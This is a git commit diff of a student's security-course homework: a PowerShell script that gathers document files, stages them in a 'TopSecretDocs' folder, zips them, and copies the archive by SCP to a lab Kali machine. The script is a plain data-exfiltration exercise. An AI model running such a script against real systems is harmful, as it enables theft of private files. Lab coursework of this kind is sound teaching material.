b592ece1cb99dc1b59def5bf75fdc970f935a0b5
cdb22 <cole.davisbrand@mymail.champlain.edu>
2022-12-09 20:10:09 -0500

    homework 14 complete

--- Week14/homework/part3.ps1
+++ Week14/homework/part3.ps1
@@ -1,18 +1,16 @@
-
 # Create and export a list of docx, pdf, txt, and xlsx files to files.csv
-#Get-ChildItem -Recurse -Include *.docx,*.pdf,*.txt,*.xlsx -Path .\Week14\homework\Documents | Export-Csv -Path .\Week14\homework\files.csv
+Get-ChildItem -Recurse -Include *.docx,*.pdf,*.txt,*.xlsx -Path .\Week14\homework\Documents | Export-Csv -Path .\Week14\homework\files.csv
 
 # Import the files.csv file
-#$fileList = Import-Csv -Path .\Week14\homework\files.csv -Header FullName
+$fileList = Import-Csv -Path .\Week14\homework\files.csv -Header FullName
 
 # Copy files to remote host (bridged Kali box)
-#foreach ($f in $fileList) {
-#  Copy-Item $f.FullName -Destination .\Week14\homework\TopSecretDocs
-#}
-
+foreach ($f in $fileList) {
+  Copy-Item $f.FullName -Destination .\Week14\homework\TopSecretDocs
+}
 
 # Zip new folder called TopSecretDocs
-#Compress-Archive -Path .\Week14\homework\TopSecretDocs -DestinationPath .\Week14\homework\secret.zip
+Compress-Archive -Path .\Week14\homework\TopSecretDocs -DestinationPath .\Week14\homework\secret.zip
 
 # SCP secret.zip to remote machine (bridged Kali box)
 Set-SCPItem -ComputerName "192.168.30.128" -Credential (Get-Credential user) -Port "22" -Destination "/home/user/Desktop" -Path ".\Week14\homework\secret.zip"
